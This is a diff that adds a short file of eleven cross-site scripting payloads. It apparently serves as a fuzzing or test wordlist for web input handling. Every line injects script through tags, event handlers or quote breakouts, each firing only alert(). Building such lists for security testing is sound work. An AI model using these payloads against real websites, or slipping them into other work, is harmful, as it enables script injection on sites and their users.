@@ -1,0 +1,11 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+<svg onload=alert('XSS')>
+<svg/onload=alert(1)>
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+"><img src=x onerror=alert('XSS')>
+'-alert('XSS')-'
+<details open ontoggle=alert('XSS')>
